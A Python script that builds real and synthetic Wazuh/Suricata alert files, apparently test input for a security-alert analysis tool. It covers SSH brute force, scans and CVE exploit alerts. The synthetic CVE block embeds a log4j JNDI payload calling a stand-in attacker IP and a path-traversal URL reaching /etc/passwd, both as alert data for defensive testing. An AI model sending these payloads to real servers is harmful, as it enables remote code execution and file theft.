"""Build the upload files in test_samples/.

REAL files are cut from the AIT-ADS scenarios (time windows, optionally thinned / filtered) and keep the raw
Wazuh JSON-lines format. SYNTHETIC files ("synthetic_" prefix) cover stories that AIT-ADS does not contain:
every synthetic alert is a deep copy of a REAL alert from the dataset in which only values are changed
(IPs, ports, users, hosts, timestamps, rule description/id/level/MITRE, log line). No new fields are added.

Usage (from the repo root, needs data/raw/ from scripts/download_data.py):
    backend\\.venv\\Scripts\\python backend\\scripts\\make_test_samples.py
"""
import copy
import json
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "backend"))
from nlp.load_data import flatten_alert  # noqa: E402  (same description the app sees)
RAW = ROOT / "data" / "raw" / "ait_ads"
OUT = ROOT / "test_samples"


def load(scenario):
    with open(RAW / f"{scenario}_wazuh.json", encoding="utf-8") as f:
        return [json.loads(line) for line in f]


def cut(alerts, windows, thin=None, keep=None):
    """Alerts inside the UTC windows. thin = {description substring: keep every Nth event},
    keep = optional filter function on the alert.
    Thinning works on the description the app sees (fast.log copies say "IDS event." in the raw file) and on
    whole events (same description + same second), so the eve.json and fast.log copies stay together."""
    thin, seen, out = thin or {}, {}, []
    for a in alerts:
        ts = a.get("@timestamp", "")[:19]
        if not any(s <= ts < e for s, e in windows):
            continue
        if keep and not keep(a):
            continue
        desc = flatten_alert(a)["description"]
        key = next((k for k in thin if k in desc), None)
        if key:
            events = seen.setdefault(key, {})
            events.setdefault((desc, ts), len(events))
            if events[(desc, ts)] % thin[key]:
                continue
        out.append(a)
    return out


def save(name, alerts, as_array=False):
    path = OUT / name
    if as_array:
        path.write_text(json.dumps(alerts, indent=1), encoding="utf-8")
    else:
        path.write_text("".join(json.dumps(a) + "\n" for a in alerts), encoding="utf-8")
    print(f"{name}: {len(alerts)} raw alerts")


# ---------------------------------------------------------------- templates for synthetic alerts
def find(alerts, rule_id, cond=lambda a: True):
    return next(a for a in alerts if a["rule"].get("id") == rule_id and cond(a))


def iso(t):
    return t.strftime("%Y-%m-%dT%H:%M:%S.000000Z")


def syslog_ts(t):
    return t.strftime("%b %d %H:%M:%S")


def sshd(tpl, t, host, agent_ip, src, port, user, kind):
    """Copy a real sshd alert (rule 5715) and turn it into a failed / invalid-user / brute-force / success event.
    Rule ids, levels and MITRE ids are the ones of the standard Wazuh sshd rules."""
    a = copy.deepcopy(tpl)
    rules = {
        "failed": ("5760", 5, "sshd: authentication failed.", ["syslog", "sshd", "authentication_failed"],
                   ["T1110.001", "T1021.004"], ["Password Guessing", "SSH"], ["Credential Access", "Lateral Movement"],
                   f"Failed password for {user} from {src} port {port} ssh2"),
        "invalid": ("5710", 5, "sshd: Attempt to login using a non-existent user", ["syslog", "sshd", "authentication_failed", "invalid_login"],
                    ["T1110.001", "T1021.004"], ["Password Guessing", "SSH"], ["Credential Access", "Lateral Movement"],
                    f"Invalid user {user} from {src} port {port}"),
        "brute": ("5763", 10, "sshd: brute force trying to get access to the system. Authentication failed.",
                  ["syslog", "sshd", "authentication_failures"], ["T1110"], ["Brute Force"], ["Credential Access"],
                  f"Failed password for {user} from {src} port {port} ssh2"),
        "success": ("5715", 3, "sshd: authentication success.", ["syslog", "sshd", "authentication_success"],
                    ["T1078", "T1021"], ["Valid Accounts", "Remote Services"],
                    ["Defense Evasion", "Persistence", "Privilege Escalation", "Initial Access", "Lateral Movement"],
                    f"Accepted password for {user} from {src} port {port} ssh2"),
    }
    rid, level, desc, groups, mids, mtech, mtac, msg = rules[kind]
    a["rule"].update({"id": rid, "level": level, "description": desc, "groups": groups,
                      "mitre": {"id": mids, "technique": mtech, "tactic": mtac}})
    a["predecoder"].update({"hostname": host, "timestamp": syslog_ts(t)})
    a["agent"]["ip"] = agent_ip
    a["data"] = {"srcip": src, "dstuser": user, "srcport": str(port)}
    a["full_log"] = f"{syslog_ts(t)} {host} sshd[{20000 + port % 9000}]: {msg}"
    a["@timestamp"] = iso(t)
    return a


def sshd_scan(tpl, t, host, agent_ip, src, port):
    a = copy.deepcopy(tpl)                      # real rule 5706 alert
    a["predecoder"].update({"hostname": host, "timestamp": syslog_ts(t)})
    a["agent"]["ip"] = agent_ip
    a["data"] = {"srcip": src, "srcport": str(port)}
    a["full_log"] = f"{syslog_ts(t)} {host} sshd[{30000 + port % 9000}]: Did not receive identification string from {src} port {port}"
    a["@timestamp"] = iso(t)
    return a


def suricata(tpl, t, agent_ip, src, dst, dport, signature, level=3, mitre=None, url="/", proto="http"):
    a = copy.deepcopy(tpl)                      # real Suricata eve alert (rule 86601)
    a["agent"]["ip"] = agent_ip
    d = a["data"]
    d.update({"src_ip": src, "src_port": str(40000 + dport % 20000), "dest_ip": dst, "dest_port": str(dport),
              "app_proto": proto, "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.000000+0000")})
    d["alert"]["signature"] = signature
    d["http"]["url"] = url
    d["files"][0]["filename"] = url
    d["flow"]["start"] = d["timestamp"]
    a["rule"].update({"description": f"Suricata: Alert - {signature}", "level": level})
    if mitre:
        a["rule"]["mitre"] = mitre
    a["@timestamp"] = iso(t)
    return a


def weblog(tpl, t, agent_ip, src, url, status="404", desc=None, rid=None, level=None):
    a = copy.deepcopy(tpl)                      # real web-accesslog alert (rule 31101)
    a["agent"]["ip"] = agent_ip
    a["data"].update({"srcip": src, "id": status, "url": url})
    if desc:
        a["rule"].update({"description": desc, "id": rid, "level": level})
    a["full_log"] = f'{src} - - [{t.strftime("%d/%b/%Y:%H:%M:%S")} +0000] "GET {url} HTTP/1.1" {status} 363 "-" "-"'
    a["@timestamp"] = iso(t)
    return a


def main():
    OUT.mkdir(exist_ok=True)
    for old in OUT.glob("*"):
        if old.suffix in (".json", ".txt"):
            old.unlink()
    rm, sh = load("russellmitchell"), load("shaw")

    # ------------------------------------------------ REAL
    # 01: Nmap / sshd scans, dirb and wpscan against the intranet web server (russellmitchell attack day)
    save("01_web_recon_scan.json", cut(rm, [("2022-01-24T03:56:40", "2022-01-24T03:58:20")],
                                       thin={"Web server 400 error code": 30, "Multiple web server 400": 15,
                                             "Dovecot Authentication Success": 3, "ClamAV": 3, "TLS invalid": 4}))
    # 03: DNS query + TLS SNI for a suspicious .ga domain, malformed TLS bursts, IDS correlation (shaw)
    save("03_suspicious_dns_tls.json", cut(sh, [("2022-01-27T18:30", "2022-01-27T19:00"), ("2022-01-28T06:40", "2022-01-28T06:55")],
                                           thin={"TLS invalid": 16, "Dovecot Authentication Success": 6}))
    # 04: the whole shaw attack chain in time order (labels.csv phases: scans -> wpscan -> dirb -> cracking -> priv-esc)
    save("04_multi_stage_attack.json", cut(sh, [("2022-01-29T14:37", "2022-01-29T15:22")],
                                           thin={"Web server 400 error code": 40, "Multiple web server 400": 10,
                                                 "TLS invalid": 6, "Dovecot Authentication Success": 4, "ClamAV": 2}))
    # 05: a normal morning: only low-severity (level <= 3) alerts - auditd, admin SSH/PAM sessions, ClamAV, APT, mail logins
    save("05_normal_noise.json", cut(rm, [("2022-01-21T06:00", "2022-01-21T10:45")],
                                     thin={"Dovecot Authentication Success": 12, "TLS invalid": 20, "ClamAV": 2},
                                     keep=lambda a: int(a["rule"]["level"]) <= 3 and a.get("decoder", {}).get("name") != "snort"))

    # ------------------------------------------------ SYNTHETIC (real alert structures, changed values)
    t_sshd = find(rm, "5715")
    t_scan = find(rm, "5706")
    t_eve = find(rm, "86601", lambda a: "Nmap" in a["rule"]["description"] and "http" in a["data"])
    t_web = find(rm, "31101")
    t_cwa = find(rm, "31104")                    # real "Common web attack." alert
    t_clam = find(rm, "52507")                   # real "ClamAV database update" alert (routine, level 3)

    def clamav(t, host, agent_ip):
        """Routine syslog alert: also tells the loader which hostname belongs to the agent IP."""
        a = copy.deepcopy(t_clam)
        a["predecoder"].update({"hostname": host, "timestamp": syslog_ts(t)})
        a["agent"]["ip"] = agent_ip
        a["full_log"] = f"{syslog_ts(t)} {host} freshclam[4242]: ClamAV update process started"
        a["@timestamp"] = iso(t)
        return a
    users = ["root", "admin", "test", "ubuntu", "oracle", "postgres", "guest", "user", "pi", "ftpuser"]

    # 02: many failed SSH logins from one IP (password guessing), no success
    t0 = datetime(2022, 3, 14, 2, 10, 5, tzinfo=timezone.utc)
    alerts = []
    for i in range(60):
        t = t0 + timedelta(seconds=4 * i)
        u = users[i % len(users)]
        kind = "invalid" if u not in ("root", "admin", "ubuntu") else "failed"
        alerts.append(sshd(t_sshd, t, "intranet-server", "10.143.2.4", "203.0.113.45", 50000 + i, u, kind))
        if i % 15 == 14:
            alerts.append(sshd(t_sshd, t + timedelta(seconds=1), "intranet-server", "10.143.2.4", "203.0.113.45", 50000 + i, u, "brute"))
    save("synthetic_02_ssh_bruteforce.json", alerts)

    # 06: failed logins, then a successful login from the same IP
    t0 = datetime(2022, 3, 15, 22, 41, 0, tzinfo=timezone.utc)
    alerts = []
    for i in range(30):
        alerts.append(sshd(t_sshd, t0 + timedelta(seconds=3 * i), "mail", "172.19.130.4", "198.51.100.23", 41000 + i,
                           "jhall", "failed"))
        if i in (9, 19, 29):
            alerts.append(sshd(t_sshd, t0 + timedelta(seconds=3 * i + 1), "mail", "172.19.130.4", "198.51.100.23", 41000 + i,
                               "jhall", "brute"))
    alerts.append(sshd(t_sshd, t0 + timedelta(seconds=95), "mail", "172.19.130.4", "198.51.100.23", 41100, "jhall", "success"))
    save("synthetic_06_bruteforce_then_success.json", alerts)

    # 07: one IP scans many hosts (sshd scan alerts on each host) and many ports (Suricata scan alerts)
    hosts = [("intranet-server", "10.143.2.4"), ("mail", "172.19.130.4"), ("vpn", "172.19.130.10"),
             ("webserver", "172.19.130.68"), ("cloud-share", "10.143.2.6"), ("internal-share", "10.143.2.8"),
             ("inet-dns", "192.168.230.2"), ("inet-firewall", "192.168.230.4")]
    t0 = datetime(2022, 3, 16, 9, 5, 0, tzinfo=timezone.utc)
    alerts = []
    for i, (h, ip) in enumerate(hosts):
        alerts.append(sshd_scan(t_scan, t0 + timedelta(seconds=2 * i), h, ip, "198.51.100.77", 51000 + i))
    for j, port in enumerate([21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 3389, 5432, 8080]):
        h, ip = hosts[j % len(hosts)]
        alerts.append(suricata(t_eve, t0 + timedelta(seconds=20 + j), ip, "198.51.100.77", ip, port,
                               "ET SCAN Possible Nmap User-Agent Observed", level=3, url="/nmaplowercheck"))
    save("synthetic_07_port_scan_many_hosts.json", alerts)

    # 08: exploit alerts that name CVEs and carry MITRE technique ids
    t0 = datetime(2022, 3, 17, 13, 20, 0, tzinfo=timezone.utc)
    exploit = {"id": ["T1190"], "technique": ["Exploit Public-Facing Application"], "tactic": ["Initial Access"]}
    privesc = {"id": ["T1068"], "technique": ["Exploitation for Privilege Escalation"], "tactic": ["Privilege Escalation"]}
    sigs = [("ET EXPLOIT Apache log4j RCE Attempt (http ldap) (CVE-2021-44228)", exploit, 10, "/?x=${jndi:ldap://203.0.113.9/a}"),
            ("ET EXPLOIT Apache HTTP Server Path Traversal (CVE-2021-41773)", exploit, 10, "/cgi-bin/.%2e/.%2e/etc/passwd"),
            ("ET EXPLOIT Possible Sudo Heap Overflow Exploitation (CVE-2021-3156)", privesc, 12, "/upload/sudoedit.sh")]
    alerts = [clamav(t0 - timedelta(hours=1), "webserver", "172.19.130.68")]
    for i in range(12):
        sig, mitre, level, url = sigs[i % 3]
        alerts.append(suricata(t_eve, t0 + timedelta(seconds=10 * i), "172.19.130.68", "203.0.113.9", "172.19.130.68", 80,
                               sig, level=level, mitre=mitre, url=url))
    alerts.append(weblog(t_cwa, t0 + timedelta(seconds=5), "172.19.130.68", "203.0.113.9", "/?x=${jndi:ldap://203.0.113.9/a}", "400",
                         desc=t_cwa["rule"]["description"], rid=t_cwa["rule"]["id"], level=t_cwa["rule"]["level"]))
    save("synthetic_08_cve_exploit.json", alerts)

    # 09: two attackers at the same time: A scans the web server, B guesses SSH passwords on the mail server
    t0 = datetime(2022, 3, 18, 15, 0, 0, tzinfo=timezone.utc)
    alerts = [clamav(t0 - timedelta(hours=1), "intranet-server", "10.143.2.4")]
    paths = ["/admin", "/backup", "/wp-login.php", "/.git/config", "/phpmyadmin", "/test", "/old", "/config.php"]
    for i in range(60):
        alerts.append(weblog(t_web, t0 + timedelta(seconds=2 * i + 1), "10.143.2.4", "203.0.113.10", paths[i % len(paths)]))
        alerts.append(sshd(t_sshd, t0 + timedelta(seconds=2 * i + 1), "mail", "172.19.130.4", "198.51.100.200", 43000 + i,
                           users[i % len(users)], "failed" if users[i % len(users)] in ("root", "admin") else "invalid"))
    save("synthetic_09_two_attackers.json", alerts)

    # ------------------------------------------------ error-handling files
    (OUT / "bad_empty.json").write_text("[]\n", encoding="utf-8")
    (OUT / "bad_format.txt").write_text("This is not an alert file.\nThe app should reject it with a clear error.\n", encoding="utf-8")
    missing = [{"agent": {"ip": "10.0.0.1", "name": "wazuh-client"}, "data": {"srcip": "203.0.113.5"},
                "full_log": "some log line without a rule or a timestamp"},
               {"rule": {"level": 5, "description": "Alert with a rule but no @timestamp"}, "agent": {"ip": "10.0.0.2"}}]
    save("bad_missing_fields.json", missing, as_array=True)


if __name__ == "__main__":
    main()
